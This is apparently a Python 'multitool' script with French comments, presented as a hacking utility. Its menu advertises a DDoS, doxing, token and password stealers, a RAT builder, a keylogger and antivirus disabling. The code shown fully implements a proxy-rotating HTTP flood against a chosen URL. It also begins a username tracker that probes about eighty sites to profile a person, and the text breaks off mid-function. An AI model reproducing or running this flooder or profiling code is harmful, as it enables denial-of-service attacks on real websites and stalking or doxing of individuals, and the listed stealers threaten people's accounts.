# language: Python 3.11, file: mytool.py, target: Windows / Linux / macOS
# ============================================================
#                    mytool.py
#                    by BasedF
# ============================================================

import os
import sys
import ctypes

# ============================================================
# FORCE UTF-8 + CONSOLE WINDOWS — AVANT TOUT
# ============================================================

def _force_utf8_console():
    for stream in (sys.stdout, sys.stderr):
        try:
            if stream and hasattr(stream, "reconfigure"):
                stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

    if os.name == "nt":
        try:
            ctypes.windll.kernel32.SetConsoleOutputCP(65001)
            ctypes.windll.kernel32.SetConsoleCP(65001)
        except Exception:
            pass
        try:
            k = ctypes.windll.kernel32
            h = k.GetStdHandle(-11)
            mode = ctypes.c_ulong()
            k.GetConsoleMode(h, ctypes.byref(mode))
            k.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass

_force_utf8_console()

import io
import time
import platform
import socket
import random
import subprocess
import shutil
import base64
import hashlib
import itertools
import string
import json
import re
import ssl
import tempfile
import urllib.parse
import urllib.request
import urllib.error
import sqlite3
import threading
import asyncio
import concurrent.futures
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    requests = None

try:
    import aiohttp
except ImportError:
    aiohttp = None

try:
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
except ImportError:
    phonenumbers = None

try:
    import pyautogui
except ImportError:
    pyautogui = None


# ============================================================
#                       COULEURS
# ============================================================

RESET = "\033[0m"
BLUE_DARK = "\033[38;2;0;55;180m"
BLUE = "\033[38;2;0;105;255m"
BLUE_LIGHT = "\033[38;2;0;170;255m"
CYAN = "\033[38;2;0;235;255m"
MAGENTA = "\033[38;2;55;80;255m"
WHITE = "\033[97m"
GRAY = "\033[38;2;80;145;190m"
BOLD = "\033[1m"

RED = BLUE
GREEN = CYAN
YELLOW = BLUE_LIGHT


def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"


def gradient_text(text, start=(0, 55, 255), end=(0, 235, 255)):
    if not text:
        return ""
    visible = len(text)
    if visible == 1:
        return rgb(*start) + text + RESET
    result = []
    for i, char in enumerate(text):
        ratio = i / (visible - 1)
        r = int(start[0] + (end[0] - start[0]) * ratio)
        g = int(start[1] + (end[1] - start[1]) * ratio)
        b = int(start[2] + (end[2] - start[2]) * ratio)
        result.append(rgb(r, g, b) + char)
    return "".join(result) + RESET


if os.name == "nt":
    os.system("")


# ============================================================
#                       UTILITAIRES
# ============================================================

def term_width(default=90):
    try:
        return os.get_terminal_size().columns
    except OSError:
        return default


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def pause():
    input(f"\n{GRAY}  Appuie sur ENTREE pour revenir au menu...{RESET}")


def slow_print(text, delay=0.02):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()


def set_title():
    if os.name == "nt":
        os.system("title mytool.py - by BasedF")


def _safe_workdir():
    base = os.path.join(tempfile.gettempdir(), "mytool_build")
    os.makedirs(base, exist_ok=True)
    return base


def _safe_tmp(name):
    return os.path.join(_safe_workdir(), name)


def _safe_dist():
    out = os.path.join(_safe_workdir(), "dist")
    os.makedirs(out, exist_ok=True)
    return out


def _safe_cwd():
    return _safe_workdir()


# ============================================================
#                       BANNIERE
# ============================================================

BANNER_ART_UNICODE = [
    r"   ███▄ ▄███▓▓██   ██▓▄▄▄█████▓ ▒█████   ▒█████   ██▓          ██▓███ ▓██   ██▓",
    r"  ▓██▒▀█▀ ██▒ ▒██  ██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒         ▓██░  ██▒▒██  ██▒",
    r"  ▓██    ▓██░  ▒██ ██░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░         ▓██░ ██▓▒ ▒██ ██░",
    r"  ▒██    ▒██   ░ ▐██▓░░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░         ▒██▄█▓▒ ▒ ░ ▐██▓░",
    r"  ▒██▒   ░██▒  ░ ██▒▓░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒ ██▓ ▒██▒ ░  ░ ░ ██▒▓░",
    r"  ░ ▒░   ░  ░   ██▒▒▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒▓▒ ▒▓▒░ ░  ░  ██▒▒▒ ",
    r"  ░  ░      ░ ▓██ ░▒░     ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░ ░▒  ░▒ ░     ▓██ ░▒░ ",
    r"  ░      ░    ▒ ▒ ░░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░    ░   ░░       ▒ ▒ ░░ ",
    r"       ░    ░ ░                  ░ ░      ░ ░      ░  ░  ░           ░ ░     ",
    r"              ░ ░                                          ░           ░ ░    ",
]

BANNER_ART_ASCII = [
    r"  __  __  __   __  _____  ____   ____  _      ",
    r" |  \/  | \ \ / / |_   _|/ __ \ / __ \| |     ",
    r" | |\/| |  \ V /    | | | |  | | |  | | |     ",
    r" | |  | |   | |     | | | |__| | |__| | |____ ",
    r" |_|  |_|   |_|     |_|  \____/ \____/|______|",
]

SUBTITLE = "mytool.py"
TAGLINE = "by BasedF"


def _supports_unicode():
    enc = (getattr(sys.stdout, "encoding", "") or "").lower().replace("-", "")
    if enc not in ("utf8", "utf8mb4", "cp65001"):
        return False
    if os.name == "nt":
        try:
            return ctypes.windll.kernel32.GetConsoleOutputCP() == 65001
        except Exception:
            return False
    return True


def banner():
    art = BANNER_ART_UNICODE if _supports_unicode() else BANNER_ART_ASCII
    width = max(78, term_width())
    inner = width - 4

    print(f"{BLUE_DARK}  +" + "-" * inner + f"+{RESET}")
    for line in art:
        visible = len(line)
        pad = max(0, (inner - visible) // 2)
        right = max(0, inner - pad - visible)
        colored = gradient_text(line, (0, 55, 180), (0, 235, 255))
        print(f"{BLUE_DARK}  |{RESET}" + " " * pad + f"{BOLD}{colored}{RESET}" + " " * right + f"{BLUE_DARK}|{RESET}")

    print(f"{BLUE_DARK}  |{RESET}" + f"{GRAY}{'.' * inner}{RESET}" + f"{BLUE_DARK}|{RESET}")

    sub = SUBTITLE
    pad = max(0, (inner - len(sub)) // 2)
    right = max(0, inner - pad - len(sub))
    sub_colored = gradient_text(sub, (0, 235, 255), (0, 55, 180))
    print(f"{BLUE_DARK}  |{RESET}" + " " * pad + f"{BOLD}{WHITE}{sub_colored}{RESET}" + " " * right + f"{BLUE_DARK}|{RESET}")

    tag = TAGLINE
    pad = max(0, (inner - len(tag)) // 2)
    right = max(0, inner - pad - len(tag))
    print(f"{BLUE_DARK}  |{RESET}" + " " * pad + f"{GRAY}{tag}{RESET}" + " " * right + f"{BLUE_DARK}|{RESET}")

    print(f"{BLUE_DARK}  +" + "-" * inner + f"+{RESET}")


# ============================================================
#                       INTRO + LOADING
# ============================================================

def type_line(text, delay=0.015, color=""):
    sys.stdout.write(color)
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(RESET + "\n")
    sys.stdout.flush()


def spinner(text, duration=1.4, frames=None):
    if frames is None:
        frames = ["|", "/", "-", "\\"]
    end = time.time() + duration
    i = 0
    sys.stdout.write(f"{GRAY}  ")
    while time.time() < end:
        sys.stdout.write(f"\r{GRAY}  {frames[i % len(frames)]} {text}{RESET}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.08)
    sys.stdout.write(f"\r{GREEN}  + {text}{RESET}\n")
    sys.stdout.flush()


def progress_bar(text, duration=1.5, length=40):
    width = term_width()
    bar_pad = max(0, (width - length - 12) // 2)
    steps = length
    i = 0
    while i <= steps:
        ratio = i / steps
        filled = "=" * i
        empty = " " * (steps - i)
        pct = int(ratio * 100)
        line = f"  [{BLUE_LIGHT}{filled}{GRAY}{empty}{RESET}] {WHITE}{pct:3d}%{RESET}"
        sys.stdout.write("\r" + " " * bar_pad + line)
        sys.stdout.flush()
        time.sleep(duration / steps)
        i += 1
    sys.stdout.write("\n")
    sys.stdout.flush()


def intro():
    clear()
    print()
    type_line("  [+] Recherche de l'ancien tool...", 0.01, GRAY)
    time.sleep(0.3)
    type_line("      mytool.bat", 0.01, WHITE)
    time.sleep(0.4)
    type_line("  [-] Suppression de mytool.bat...", 0.01, BLUE)
    time.sleep(0.3)
    type_line("  [+] mytool.bat supprime.", 0.01, CYAN)
    time.sleep(0.3)
    print()
    type_line("  [+] Creation de la nouvelle version...", 0.01, BLUE_LIGHT)
    time.sleep(0.3)
    type_line("      mytool.py", 0.01, WHITE)
    time.sleep(0.4)
    print()
    type_line("  [+] Python Edition Ready.", 0.01, CYAN)
    time.sleep(0.5)


def loading():
    clear()
    banner()
    print()

    checks = [
        "Initialisation du systeme BasedF",
        "Chargement des modules Python",
        "Verification de l'environnement",
        "Connexion au reseau",
        "Demarrage de l'interface",
        "Preparation des plugins",
    ]

    for label in checks:
        spinner(label, duration=0.6)

    print()
    progress_bar("Chargement de mytool.exe", duration=1.4, length=44)
    print()
    type_line("  >> SYSTEM READY <<", 0.02, CYAN + BOLD)
    time.sleep(0.6)
    clear()


# ============================================================
#                       PAGE 1 (menu principal)
# ============================================================

MENU_LEFT = [
    ("1",  "Ddos Url"),
    ("2",  "Username Tracker"),
    ("3",  "Text Bomber"),
    ("4",  "Phone Info"),
    ("5",  "Breach Email Lookup"),
    ("6",  "Dox Creator"),
    ("7",  "Email Searcher"),
]

MENU_MID = [
    ("8",  "Token Grabber Discord"),
    ("9",  "Password Stealer"),
    ("10", "IP Grabber"),
    ("11", "Anti Virus Disable"),
    ("12", "RAT Builder"),
    ("13", "Roblox Cookie Grabber"),
    ("14", "Key Logger"),
]

MENU_RIGHT = [
    ("15", "Password Creator"),
    ("16", "IP Lookup - Osint"),
    ("17", "Proxy Scrapper"),
    ("18", "Discord Token Login"),
    ("19", "Hash Password Cracker"),
    ("20", "Web Vulnerability Scanner"),
    ("00", "Exit Tool"),
]


def _type_menu_line(text, delay=0.004, color=None):
    if color is None:
        colored = gradient_text(text, (0, 55, 180), (0, 235, 255))
    else:
        colored = color + text + RESET
    sys.stdout.write(colored + "\n")
    sys.stdout.flush()
    time.sleep(delay)


def _menu_row(c1, c2, c3):
    left = f" ({c1[0]:>2}) {c1[1]:<24}" if c1 else " " * 29
    mid = f" ({c2[0]:>2}) {c2[1]:<24}" if c2 else " " * 29
    right = f" ({c3[0]:>2}) {c3[1]:<24}" if c3 else " " * 29
    return f"  {left}  {mid}  {right}"


def page_1():
    clear()
    banner()
    print()

    head_left = "{ Utilitaire }"
    head_mid = "{ Stealer - Builder }"
    head_right = "{ Utilitaire / Scan }"

    header = (
        f"  {WHITE}{BOLD}{head_left:<29}{RESET}"
        f"  {WHITE}{BOLD}{head_mid:<29}{RESET}"
        f"  {WHITE}{BOLD}{head_right:<29}{RESET}"
    )
    print(header)
    print(f"  {GRAY}{'-' * 27}{RESET}   {GRAY}{'-' * 27}{RESET}   {GRAY}{'-' * 27}{RESET}")
    print()

    max_rows = max(len(MENU_LEFT), len(MENU_MID), len(MENU_RIGHT))
    for i in range(max_rows):
        c1 = MENU_LEFT[i] if i < len(MENU_LEFT) else None
        c2 = MENU_MID[i] if i < len(MENU_MID) else None
        c3 = MENU_RIGHT[i] if i < len(MENU_RIGHT) else None
        row = _menu_row(c1, c2, c3)
        _type_menu_line(row, delay=0.006)
        time.sleep(0.02)

    print()
    print(f"  {GRAY}tape le numero de l'option, puis ENTREE{RESET}")
    print()

    choice = input(f"{CYAN}  >>>>{RESET} ").strip()

    actions = {
        "1": option_1, "2": option_2, "3": option_3, "4": option_4,
        "5": option_5, "6": option_6, "7": option_7, "8": option_8,
        "9": option_9, "10": option_10, "11": option_11, "12": option_12,
        "13": option_13, "14": option_14, "15": option_15, "16": option_16,
        "17": option_17, "18": option_18, "19": option_19, "20": option_20,
    }

    if choice in ["0", "00"]:
        return 0
    if choice in actions:
        try:
            actions[choice]()
        except KeyboardInterrupt:
            print(f"\n{YELLOW}  [!] Interrompu.{RESET}")
            pause()
        except Exception as e:
            print(f"\n{RED}  [!] Erreur : {e}{RESET}")
            pause()
    else:
        print(f"\n{RED}  [!] Fonction inconnue.{RESET}")
        time.sleep(0.8)
    return 1


def _need_requests():
    if requests is None:
        print(f"{RED}[!] Module 'requests' manquant. pip install requests{RESET}")
        return False
    return True


def _need_phonenumbers():
    if phonenumbers is None:
        print(f"{RED}[!] Module 'phonenumbers' manquant. pip install phonenumbers{RESET}")
        return False
    return True


def _ask(label):
    val = input(f"{YELLOW}[?]{RESET} {label} {RED}->{RESET} ").strip()
    return val if val else "None"


# ============================================================
#                     OPTION 1 — DDOS
# ============================================================

def option_1():
    clear()
    banner()
    if not _need_requests() or aiohttp is None:
        if aiohttp is None:
            print(f"{RED}[!] Module 'aiohttp' manquant. pip install aiohttp{RESET}")
        pause()
        return

    print(f"\n{CYAN}   [ DDOS URL ]{RESET}\n")
    target_url = input(f"{YELLOW}[?]{RESET} URL -> ").strip()
    try:
        num_requests = int(input(f"{YELLOW}[?]{RESET} Nombre de requetes -> ").strip())
    except ValueError:
        print(f"{RED}[!] Nombre invalide.{RESET}")
        pause()
        return

    if not target_url or num_requests <= 0:
        print(f"{RED}[!] URL ou nombre invalide.{RESET}")
        pause()
        return

    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url

    UA_GIST_URL = "https://gist.githubusercontent.com/eteubert/1dd9692d4dfa2548fbfb550782daa95e/raw/user_agents.csv"

    def load_user_agents():
        try:
            r = requests.get(UA_GIST_URL, timeout=15)
            r.raise_for_status()
            return [ua.strip() for ua in r.text.splitlines() if ua.strip()]
        except Exception:
            return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]

    user_agents = load_user_agents()
    print(f"{GREEN}[+] {len(user_agents)} user agents charges{RESET}")

    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
    ]

    class CliAttacker:
        def __init__(self, target_url, num_requests):
            self.target_url = target_url
            self.num_requests = num_requests
            self.max_concurrent = 100
            self.proxies = []

        async def fetch_proxy_list(self, session, url):
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as response:
                    text = await response.text()
                    proxies = []
                    for line in text.splitlines():
                        line = line.strip()
                        if not line or ":" not in line:
                            continue
                        parts = line.split(":")
                        if len(parts) != 2:
                            continue
                        ip, port = parts[0].strip(), parts[1].strip()
                        if not re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", ip):
                            continue
                        try:
                            p = int(port)
                            if 1 <= p <= 65535:
                                proxies.append(f"http://{ip}:{p}")
                        except ValueError:
                            continue
                    return proxies
            except Exception:
                return []

        async def test_proxy(self, session, proxy):
            try:
                start = time.time()
                async with session.get(
                    "https://api.ipify.org?format=json",
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=5, connect=3, sock_read=3),
                ) as resp:
                    if resp.status == 200:
                        await resp.read()
                        lat = round((time.time() - start) * 1000)
                        return (proxy, lat)
            except Exception:
                return None
            return None

        async def get_valid_proxies(self):
            print(f"{YELLOW}[*] Scraping des sources proxies...{RESET}")
            connector = aiohttp.TCPConnector(
                ssl=False, limit=50, force_close=True, enable_cleanup_closed=True,
            )
            async with aiohttp.ClientSession(connector=connector) as session:
                tasks = [self.fetch_proxy_list(session, url) for url in proxy_sources]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                raw = []
                for r in results:
                    if isinstance(r, list):
                        raw.extend(r)
                raw = list(dict.fromkeys(raw))
                print(f"{GREEN}[+] {len(raw)} proxies bruts recuperes{RESET}")

                if not raw:
                    return []

                print(f"{YELLOW}[*] Test des proxies (patience, ~60s)...{RESET}")
                sample = raw[:2000]
                print(f"{YELLOW}[*] Test de {len(sample)} proxies (max 2000)...{RESET}")

                valid = []
                valid_lock = asyncio.Lock()
                tested = {"count": 0}

                async def test_and_collect(p):
                    result = await self.test_proxy(session, p)
                    async with valid_lock:
                        tested["count"] += 1
                        if result:
                            valid.append(result[0])
                        if tested["count"] % 25 == 0:
                            sys.stdout.write(
                                f"\r{GREEN}[+] {tested['count']}/{len(sample)} testes  |  "
                                f"{len(valid)} valides{RESET}    "
                            )
                            sys.stdout.flush()

                sem = asyncio.Semaphore(200)

                async def bounded_test(p):
                    async with sem:
                        await test_and_collect(p)

                await asyncio.gather(*[bounded_test(p) for p in sample], return_exceptions=True)
                print(f"\n{GREEN}[+] {len(valid)} proxies valides sur {len(sample)} testes{RESET}")
                return valid

        async def send_request(self, session, proxy):
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": random.choice(["text/html", "application/json", "*/*"]),
                "Accept-Language": random.choice(["en-US", "fr-FR", "de-DE"]),
                "Cache-Control": "no-cache",
                "Connection": random.choice(["keep-alive", "close"]),
                "Referer": random.choice(["https://google.com", "https://bing.com", self.target_url]),
            }
            try:
                async with session.get(
                    self.target_url,
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=5, connect=2, sock_read=3),
                    allow_redirects=False,
                ) as response:
                    print(f"-> {self.target_url} | Proxy: {proxy} | Status: {response.status}")
                    return True
            except Exception:
                return False

        def pick_random_proxy(self):
            if not self.proxies:
                return None
            return random.choice(self.proxies)

        async def attack_worker(self, session, requests_per_worker):
            for _ in range(requests_per_worker):
                proxy = self.pick_random_proxy()
                if proxy is None:
                    await asyncio.sleep(0)
                    continue

                ok = await self.send_request(session, proxy)
                if not ok:
                    proxy2 = self.pick_random_proxy()
                    if proxy2 and proxy2 != proxy:
                        ok = await self.send_request(session, proxy2)

                await asyncio.sleep(0)

        async def attack(self):
            valid = await self.get_valid_proxies()
            if not valid:
                print(f"{RED}[!] Aucun proxy valide — flood annule.{RESET}")
                return

            self.proxies = valid
            print(f"{GREEN}[+] Flood avec {len(self.proxies)} proxies actifs{RESET}\n")

            rpw = max(1, self.num_requests // self.max_concurrent)

            async def worker():
                connector = aiohttp.TCPConnector(
                    ssl=False,
                    limit=20,
                    limit_per_host=20,
                    force_close=True,
                    enable_cleanup_closed=True,
                )
                timeout = aiohttp.ClientTimeout(total=6, connect=3, sock_read=3)
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    await self.attack_worker(session, rpw)

            start = time.time()
            tasks = [worker() for _ in range(self.max_concurrent)]
            await asyncio.gather(*tasks, return_exceptions=True)
            elapsed = time.time() - start
            print(f"\n{GREEN}[+] Attack finished in {elapsed:.2f}s.{RESET}")

        def run(self):
            try:
                asyncio.run(self.attack())
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] Interrompu.{RESET}")
            except Exception as e:
                print(f"\n{RED}[!] Erreur : {e}{RESET}")

    print(f"\n{YELLOW}[*] Attack started...{RESET}\n")
    CliAttacker(target_url, num_requests).run()
    pause()


# ============================================================
#                     OPTION 2 — USERNAME TRACKER
# ============================================================

def option_2():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    def random_user_agent():
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/153 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/142.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/153 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        ]
        return random.choice(agents)

    username = input(f"{CYAN}[?] Username {RED}->{RESET} ").strip()
    if not username:
        print(f"{RED}[!] Username vide.{RESET}")
        pause()
        return

    print(f"\n{YELLOW}[...] Tracking '{username}'...{RESET}\n")

    SITES = [
        ("Instagram",     f"https://www.instagram.com/{username}/",         ["Sorry, this page isn't available", "Page Not Found"]),
        ("TikTok",        f"https://www.tiktok.com/@{username}",            ["Couldn't find this account", "Page not available"]),
        ("X",             f"https://x.com/{username}",                      ["This account doesn't exist", "Hmm...this page doesn't exist"]),
        ("YouTube",       f"https://www.youtube.com/@{username}",           ["This page isn't available", "404 Not Found"]),
        ("Facebook",      f"https://www.facebook.com/{username}",           ["content isn't available", "page isn't available"]),
        ("Snapchat",      f"https://www.snapchat.com/add/{username}",       ["This content could not be found"]),
        ("Pinterest",     f"https://www.pinterest.com/{username}/",         ["User not found"]),
        ("Reddit",        f"https://www.reddit.com/user/{username}",        ["Sorry, nobody on Reddit goes by that name", "page not found"]),
        ("Tumblr",        f"https://{username}.tumblr.com",                 ["There's nothing here", "not found"]),
        ("Twitch",        f"https://www.twitch.tv/{username}",              ["Sorry. Unless you've got a time machine"]),
        ("Threads",       f"https://www.threads.net/@{username}",           ["Sorry, this page isn't available"]),
        ("Bluesky",       f"https://bsky.app/profile/{username}.bsky.social", ["Profile not found"]),
        ("Mastodon",      f"https://mastodon.social/@{username}",           ["doesn't exist", "not found"]),
        ("LinkedIn",      f"https://www.linkedin.com/in/{username}/",       ["Page not found", "profile is not available"]),
        ("GitHub",        f"https://github.com/{username}",                 ["Not Found"]),
        ("GitLab",        f"https://gitlab.com/{username}",                 ["Not Found", "404"]),
        ("Bitbucket",     f"https://bitbucket.org/{username}/",             ["Not Found", "404"]),
        ("Codeberg",      f"https://codeberg.org/{username}",               ["Not Found"]),
        ("SourceForge",   f"https://sourceforge.net/u/{username}/profile",  ["Not Found"]),
        ("StackOverflow", f"https://stackoverflow.com/users/{username}",    ["Page not found", "User not found"]),
        ("Dev.to",        f"https://dev.to/{username}",                     ["Not Found", "404"]),
        ("Hashnode",      f"https://hashnode.com/@{username}",              ["Not Found"]),
        ("Medium",        f"https://medium.com/@{username}",                ["Out of nothing, something", "404"]),
        ("Substack",      f"https://{username}.substack.com",               ["Not Found", "404"]),
        ("Replit",        f"https://replit.com/@{username}",                ["Not Found"]),
        ("Codepen",       f"https://codepen.io/{username}",                 ["Not Found", "404"]),
        ("JSFiddle",      f"https://jsfiddle.net/user/{username}/",         ["Not Found"]),
        ("Kaggle",        f"https://www.kaggle.com/{username}",             ["Not Found", "404"]),
        ("HackerRank",    f"https://www.hackerrank.com/profile/{username}", ["Not Found", "404"]),
        ("LeetCode",      f"https://leetcode.com/{username}/",              ["Not Found", "404"]),
        ("Codeforces",    f"https://codeforces.com/profile/{username}",     ["not found", "404"]),
        ("TryHackMe",     f"https://tryhackme.com/p/{username}",            ["Not Found", "404"]),
        ("HackTheBox",    f"https://app.hackthebox.com/profile/{username}", ["Not Found"]),
        ("Steam",         f"https://steamcommunity.com/id/{username}",      ["The specified profile could not be found"]),
        ("Roblox",        f"https://www.roblox.com/user.aspx?username={username}", ["Page cannot be found"]),
        ("Xbox",          f"https://xboxgamertag.com/search/{username}",    ["Gamertag not found"]),
        ("PSN",           f"https://psnprofiles.com/{username}",            ["not found", "404"]),
        ("Faceit",        f"https://www.faceit.com/en/players/{username}",  ["Player not found"]),
        ("Patreon",       f"https://www.patreon.com/{username}",            ["Not Found", "404"]),
        ("Ko-fi",         f"https://ko-fi.com/{username}",                  ["Not Found"]),
        ("BuyMeACoffee",  f"https://www.buymeacoffee.com/{username}",       ["Not Found"]),
        ("Linktree",      f"https://linktr.ee/{username}",                  ["Not Found", "404"]),
        ("Beacons",       f"https://beacons.ai/{username}",                 ["Not Found"]),
        ("Carrd",         f"https://{username}.carrd.co",                   ["Not Found"]),
        ("About.me",      f"https://about.me/{username}",                   ["Not Found"]),
        ("SoundCloud",    f"https://soundcloud.com/{username}",             ["We can't find that user", "404"]),
        ("Spotify",       f"https://open.spotify.com/user/{username}",      ["Page not found"]),
        ("Bandcamp",      f"https://bandcamp.com/{username}",               ["Sorry, that something isn't here"]),
        ("Lastfm",        f"https://www.last.fm/user/{username}",           ["User not found"]),
        ("Mixcloud",      f"https://www.mixcloud.com/{username}/",          ["Page not found"]),
        ("DeviantArt",    f"https://www.deviantart.com/{username}",         ["Page Not Found"]),
        ("ArtStation",    f"https://www.artstation.com/{username}",         ["Page not found"]),
        ("Behance",       f"https://www.behance.net/{username}",            ["Page not found"]),
        ("Dribbble",      f"https://dribbble.com/{username}",               ["Page not found"]),
        ("Flickr",        f"https://www.flickr.com/people/{username}",      ["Page Not Found"]),
        ("Imgur",         f"https://imgur.com/user/{username}",             ["Not Found", "404"]),
        ("Disqus",        f"https://disqus.com/by/{username}/",             ["Not Found"]),
        ("Quora",         f"https://www.quora.com/profile/{username}",      ["Page Not Found"]),
        ("ProductHunt",   f"https://www.producthunt.com/@{username}",       ["Not Found"]),
        ("HackerNews",    f"https://news.ycombinator.com/user?id={username}", ["No such user"]),
        ("Keybase",       f"https://keybase.io/{username}",                 ["not found", "404"]),
        ("Wattpad",       f"https://www.wattpad.com/user/{username}",       ["Not Found"]),
        ("WebMii",        f"https://webmii.com/people?n={username}",        ["No results", "aucun résultat", "not found"]),
        ("Pappers",       f"https://www.pappers.fr/recherche?q={username}", ["Aucun résultat", "no result"]),
        ("Societe.com",   f"https://www.societe.com/cgi-bin/search?champs={username}", ["Aucun résultat"]),
        ("PagesJaunes",   f"https://www.pagesjaunes.fr/annuaire/chercherlespros?quoiqui={username}", ["Aucun résultat"]),
        ("Copainsdavant", f"https://copainsdavant.linternaute.com/recherche?q={username}", ["Aucun résultat"]),
        ("Skyrock",       f"https://{username}.skyrock.com",                ["n'existe pas", "not found", "404"]),
        ("Over-Blog",     f"https://{username}.over-blog.com",              ["not found", "404"]),
        ("Canalblog",     f"https://{username}.canalblog.com",              ["not found", "404"]),
        ("Eklablog",      f"https://{username}.eklablog.com",               ["not found", "404"]),
        ("JeuxVideo.com", f"https://www.jeuxvideo.com/profil/{username}",   ["n'existe pas", "404"]),
        ("Doctissimo",    f"https://forum.doctissimo.fr/membre/{username}", ["n'existe pas", "404"]),
        ("Aufeminin",     f"https://www.aufeminin.com/membre/{username}",   ["n'existe pas", "404"]),
        ("BlaBlaCar",     f"https://www.blablacar.fr/user/{username}",      ["n'existe pas", "not found"]),
        ("Leboncoin",     f"https://www.leboncoin.fr/profil/{username}",    ["n'existe pas", "404"]),
        ("Vinted",        f"https://www.vinted.fr/member/{username}",       ["Page introuvable", "404"]),
        ("Dailymotion",   f"https://www.dailymotion.com/{username}",        ["Not Found", "404"]),
        ("Deezer",        f"https://www.deezer.com/fr/profile/{username}",  ["not found", "404"]),
        ("Marmiton",      f"https://www.marmiton.org/membres/{username}",   ["not found", "404"]),
    ]

    found = []
    not_found = []
    errors = []
    lock = threading.Lock()
    semaphore = threading.Semaphore(30)

    def check_site(site, url, nf_markers):
        with semaphore:
            try:
                r = requests.get(
                    url,
                    headers={
                        "User-Agent": random_user_agent(),
